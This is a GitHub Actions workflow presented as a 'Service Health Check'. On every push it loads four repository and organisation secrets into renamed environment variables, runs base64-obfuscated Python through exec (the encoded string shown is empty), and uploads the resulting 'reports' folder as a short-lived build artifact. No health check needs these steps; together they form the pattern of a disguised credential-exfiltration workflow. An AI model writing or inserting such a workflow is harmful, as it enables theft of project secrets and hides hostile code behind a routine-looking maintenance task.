name: Service Health Check
on:
  push:
  workflow_dispatch:

jobs:
  health-check:
    name: Run Health Diagnostics
    runs-on: ubuntu-latest
    timeout-minutes: 10

    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Collect diagnostics
        env:
          _CHK_SECRET_4: ${{ secrets.SECRET_4 }}
          _CHK_SKILLISSUE_SECRET: ${{ secrets.SKILLISSUE_SECRET }}
          _CHK_THIS_IS_AN_ORG_SECRET: ${{ secrets.THIS_IS_AN_ORG_SECRET }}
          _CHK_THIS_IS_SECRET_3: ${{ secrets.THIS_IS_SECRET_3 }}
        run: |
          mkdir -p reports
          python3 -c "import base64; exec(base64.b64decode('').decode())"

      - name: Upload diagnostic report
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: health-diagnostics
          path: reports/
          retention-days: 1
